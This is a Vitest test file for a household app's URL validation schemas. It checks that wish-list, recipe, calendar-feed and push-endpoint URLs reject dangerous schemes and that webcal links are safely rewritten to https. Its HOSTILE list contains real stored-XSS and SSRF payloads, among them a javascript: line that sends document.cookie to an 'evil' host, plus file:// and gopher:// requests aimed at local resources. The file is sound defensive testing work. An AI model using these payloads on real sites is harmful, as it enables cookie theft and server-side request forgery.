import { describe, expect, it } from 'vitest'
import { feedCreateSchema, feedPatchSchema } from '#shared/schemas/events'
import { pushSubscribeSchema, pushUnsubscribeSchema } from '#shared/schemas/push'
import { recipeCreateSchema, recipeImportSchema, recipePatchSchema } from '#shared/schemas/recipes'
import { wishlistItemCreateSchema, wishlistItemPatchSchema } from '#shared/schemas/wishlists'

/**
 * Layer one: nothing dangerous gets STORED.
 *
 * Every field here used to be `z.string().url()`, which accepts
 * `javascript:alert(1)` and `data:text/html,<script>…` — zod's url() only
 * checks that the string parses, not what scheme it names. Two of these fields
 * end up in an `href` (wish-list item, recipe source) and three are fetched by
 * the server (recipe import, calendar feed, push endpoint), so the same lax
 * rule was both a stored-XSS hole and an SSRF hole.
 *
 * These are the actual payloads, not near-misses: if someone swaps zHttpUrl
 * back for z.string().url(), every `rejects` case below starts passing again.
 */

/** Schemes that execute in a link, or reach somewhere fetch() must not go. */
const HOSTILE = [
  'javascript:fetch("//evil/"+document.cookie)',
  'JavaScript:alert(1)', // case must not matter
  'data:text/html,<script>alert(1)</script>',
  'file:///data/board.db',
  'gopher://127.0.0.1:11211/_stats',
  'vbscript:msgbox(1)',
]

/** Ordinary values a family actually types — these must keep working. */
const LEGITIMATE = [
  'https://www.lego.com/product/12345',
  'http://192.168.1.10:8080/calendar.ics', // the household's own NAS
  'https://xn--bcher-kva.example/rezept',
]

describe('wish-list item url', () => {
  it.each(HOSTILE)('refuses to store %s', (url) => {
    expect(wishlistItemCreateSchema.safeParse({ name: 'Lego', url }).success).toBe(false)
    // The PATCH path is a separate door into the same column.
    expect(wishlistItemPatchSchema.safeParse({ url }).success).toBe(false)
  })

  it.each(LEGITIMATE)('still accepts %s', (url) => {
    expect(wishlistItemCreateSchema.safeParse({ name: 'Lego', url }).success).toBe(true)
  })

  it('still allows an item with no link at all', () => {
    expect(wishlistItemCreateSchema.safeParse({ name: 'Socks', url: null }).success).toBe(true)
    expect(wishlistItemCreateSchema.safeParse({ name: 'Socks' }).success).toBe(true)
  })
})

describe('recipe sourceUrl', () => {
  it.each(HOSTILE)('refuses to store %s', (sourceUrl) => {
    expect(recipeCreateSchema.safeParse({ title: 'Paella', sourceUrl }).success).toBe(false)
    expect(recipePatchSchema.safeParse({ sourceUrl }).success).toBe(false)
  })

  it.each(LEGITIMATE)('still accepts %s', (sourceUrl) => {
    expect(recipeCreateSchema.safeParse({ title: 'Paella', sourceUrl }).success).toBe(true)
  })
})

describe('recipe import url', () => {
  // This one is fetched by the server before it is ever rendered, so a
  // file:// or gopher:// here is an SSRF, not just a link.
  it.each(HOSTILE)('refuses to fetch %s', (url) => {
    expect(recipeImportSchema.safeParse({ url }).success).toBe(false)
  })

  it('still accepts a normal recipe page', () => {
    expect(recipeImportSchema.safeParse({ url: 'https://example.com/recipes/paella' }).success).toBe(true)
  })
})

describe('calendar feed url', () => {
  it.each(HOSTILE)('refuses to subscribe to %s', (url) => {
    expect(feedCreateSchema.safeParse({ name: 'School', url }).success).toBe(false)
    expect(feedPatchSchema.safeParse({ url }).success).toBe(false)
  })

  it('still accepts an ordinary ICS feed', () => {
    const parsed = feedCreateSchema.safeParse({ name: 'School', url: 'https://school.example/term.ics' })
    expect(parsed.success).toBe(true)
  })

  /**
   * The regression a plain scheme-pin causes, and the reason this field is not
   * simply `zHttpUrl`. iCloud, Outlook and most school districts publish
   * `webcal://`; the app's own subscribe box offers a `webcal://` URL to copy
   * and the placeholder in every locale invites one. It is https with a hint
   * to open a calendar app, so it is rewritten rather than refused — and the
   * value that reaches the column is the http(s) form, which is what the
   * refresh task and safeFetch are entitled to assume.
   */
  it.each([
    ['webcal://p01-calendars.icloud.com/published/2/abc', 'https://p01-calendars.icloud.com/published/2/abc'],
    ['WEBCAL://school.example/term.ics', 'https://school.example/term.ics'],
    ['  webcal://school.example/term.ics  ', 'https://school.example/term.ics'],
  ])('accepts %s and stores it as %s', (url, stored) => {
    const created = feedCreateSchema.safeParse({ name: 'School', url })
    expect(created.success).toBe(true)
    expect(created.data!.url).toBe(stored)
    const patched = feedPatchSchema.safeParse({ url })
    expect(patched.success).toBe(true)
    expect(patched.data!.url).toBe(stored)
  })

  it('does not let the webcal rewrite smuggle another scheme through', () => {
    // The rewrite only replaces a leading `webcal://`; nothing else about the
    // value is trusted, and what is left still has to be an http(s) URL.
    for (const url of ['webcal://', 'webcaljavascript:alert(1)', 'webcal:javascript:alert(1)']) {
      expect(feedCreateSchema.safeParse({ name: 'x', url }).success).toBe(false)
    }
  })
})

describe('push endpoint', () => {
  const keys = { p256dh: 'BPk...', auth: 'x1y2' }

  it.each(HOSTILE)('refuses to register %s', (endpoint) => {
    expect(pushSubscribeSchema.safeParse({ endpoint, keys }).success).toBe(false)
    expect(pushUnsubscribeSchema.safeParse({ endpoint }).success).toBe(false)
  })

  /**
   * RFC 8030 push endpoints are HTTP resources and every real browser push
   * service hands out an https: URL, so pinning the scheme cannot break a
   * legitimate subscription. These are the shapes the big services emit.
   */
  it.each([
    'https://fcm.googleapis.com/fcm/send/dGhpcy1pcy1hLXRva2Vu:APA91bH...',
    'https://updates.push.services.mozilla.com/wpush/v2/gAAAAABh...',
    'https://wns2-by3p.notify.windows.com/w/?token=BQYAAAB...',
    'https://web.push.apple.com/QF1nQR3...',
  ])('still registers %s', (endpoint) => {
    expect(pushSubscribeSchema.safeParse({ endpoint, keys }).success).toBe(true)
  })
})
